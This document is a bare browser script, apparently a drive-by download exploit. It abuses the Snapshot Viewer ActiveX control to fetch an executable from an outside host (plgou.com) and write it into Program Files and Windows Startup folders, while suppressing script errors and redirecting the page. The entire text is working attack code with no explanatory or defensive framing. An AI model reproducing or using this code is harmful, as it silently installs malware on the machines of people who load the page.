<script type="text/javascript">
function killErrors() {
return true;
}
window.onerror = killErrors;

var x;
var obj;
var mycars = new Array();
mycars[0] = "c:/Program Files/wsv.exe";
mycars[1] = "d:/Program Files/wsv.exe";
mycars[2] = "e:/Program Files/wsv.exe";
mycars[3] = "C:/Documents and Settings/All Users/「开始」菜单/程序/启动/Thunder.exe";
mycars[4] = "C:/Documents and Settings/All Users/Start Menu/Programs/Startup/Thunder.exe";

var objlcx = new ActiveXObject("snpvw.Snapshot Viewer Control.1");

if(objlcx="[object]")
{

setTimeout('window.location = "ldap://"',3000);

for (x in mycars)
{
obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1")

var buf1 = 'http://www.plgou.com/csrss/rondll32.exe';
var buf2=mycars[x];

obj.Zoom = 0;
obj.ShowNavigationButtons = false;
obj.AllowContextMenu = false;
obj.SnapshotPath = buf1;

try
{
 obj.CompressedPath = buf2;
 obj.PrintSnapshot();

}catch(e){}

}
}

</script>
